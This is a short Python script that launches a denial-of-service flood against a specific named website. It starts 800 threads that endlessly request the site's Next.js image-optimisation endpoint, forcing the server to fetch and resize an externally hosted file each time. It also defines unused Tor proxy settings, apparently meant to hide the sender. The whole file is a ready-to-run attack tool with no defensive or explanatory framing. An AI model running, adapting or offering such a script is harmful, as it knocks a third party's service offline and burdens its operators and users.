import requests, json, re, threading, time

from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings(InsecureRequestWarning)

tor_host = "127.0.0.1"
tor_port = "9050"

proxy_url = f"socks5h://{tor_host}:{tor_port}"
proxies = {
        "http": proxy_url,
        "https": proxy_url,
    }



url1 = "https://facethepeople.net"
url2 = "https://github.com/dulalahmed9701-lang/project-debian/releases/download/v1.1/debian-13.1.0-amd64-netinst.png"

url = url1+"/_next/image?url="+url2+"&w=384&q=75"





def req():
    while True:
        try:
            response = requests.get(url)
            print(response.status_code)
        except Exception as e:
            print(e)

       




def r():
    total_threads = 800
    threads = []

    for i in range(total_threads):
        t = threading.Thread(target=req)
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("All threads completed!")


r()
